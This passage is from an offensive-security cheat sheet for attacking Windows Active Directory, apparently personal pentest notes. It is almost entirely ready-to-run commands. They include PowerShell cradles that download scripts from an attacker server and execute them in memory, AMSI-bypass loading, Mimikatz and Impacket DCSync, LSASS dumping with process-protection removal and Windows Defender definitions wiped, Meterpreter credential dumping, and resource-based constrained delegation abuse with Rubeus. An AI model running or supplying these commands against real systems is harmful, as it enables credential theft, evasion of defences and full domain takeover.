Bypass folder of web server will have AMSI bypass splitted and loaded in parts, then, run whatever payload chosen.
### Powershell useful commands
```
# Load script to memory
(New-Object System.Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1') | iex
IEX (New-Object Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1')

# Create credential object
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)

# Encoded command
$string = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1')"
$encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
```

### Unconstrained Delegation
```
# Export Kerberos tickets from memory
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::tickets /export"'

# Monitor Kerberos tickets on unconstrained delegation machine
Invoke-Rubeus -Command "monitor /internal:5"
```

### DCSync
```
# Using Mimikatz
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /domain:infinity.com /all"'

# Using Impacket:
proxychains -q python examples/secretsdump.py tricky.com/sqlsvc:123456@172.16.184.150
proxychains -q python examples/secretsdump.py tricky.com/sqlsvc@172.16.184.150 -hashes aad3b435b51404eeaad3b435b51404ee:[NTHash]

# Using DSInternals
- Download the current release from GitHub.
- Unblock the ZIP file, using either the Properties dialog or the Unblock-File cmdlet. If you fail to do so, all the extracted DLLs will inherit this attribute and PowerShell will refuse to load them.
- Extract the DSInternals directory to your PowerShell modules directory, e.g. C:\Windows\system32\WindowsPowerShell\v1.0\Modules\DSInternals or C:\Users\John\Documents\WindowsPowerShell\Modules\DSInternals.
- (Optional) If you copied the module to a different directory than advised in the previous step, you have to manually import it using the Import-Module cmdlet.
Get-ADReplAccount -All -Server 'dc01.contoso.com'
```

### Credentials Theft
```
# Dump credentials with PPL using Mimikatz
iwr -UseBasicParsing -Uri http://192.168.45.193/Tools/mimikatz.exe -OutFile mimikatz.exe
iwr -UseBasicParsing -Uri http://192.168.45.193/Tools/mimidrv.sys -OutFile mimidrv.sys
.\mimikatz.exe
log
privilege::debug
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
exit

# Meterpreter
load kiwi
getsystem
creds_all
lsa_dump_secrets
lsa_dump_sam

# ProcDump
.\PsExec.exe \\jump09.ops.comply.com -i -s cmd.exe
& "c:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
procdump.exe -accepteula -ma lsass.exe lsass.dmp
exit
cp '\\jump09.ops.comply.com\c$\lsass.dmp' .
sekurlsa::minidump "C:\Users\ofir\Desktop\lsass.dmp"
sekurlsa::logonpasswords
```

### RBCD
```
# Using PowerView
Import-Module .\PowerView.ps1
# Get domain SID
$ComputerSid = Get-DomainComputer file06 -Properties objectsid | Select -Expand objectsid
Convert-SidToName $ComputerSid
# Create ACE
# Make sure the change the SID!
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2032401531-514583578-4118054891-1107)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
# Set ACE on target computer
Get-DomainComputer jump09 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
# Verify
$RawBytes = (Get-DomainComputer jump09).'msds-allowedtoactonbehalfofotheridentity'
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
# S4U
runas /netonly /user:ops.comply.com\administrator cmd.exe
.\Rubeus.exe s4u /user:file06$ /rc4:[NTHash] /impersonateuser:Administrator /msdsspn:cifs/jump09.ops.comply.com /ptt
ls \\jump09.ops.comply.com\c$


# Using Impacket
# Read the attribute
rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action 'read' 'domain'/'PowerfulUser':'Password'
# Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-from 'controlledaccount' -delegate-to 'target$' -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'Password'
# With NTHash
python3 rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip 10.10.10.1 -hashes :[NTHash] test.local/john
```
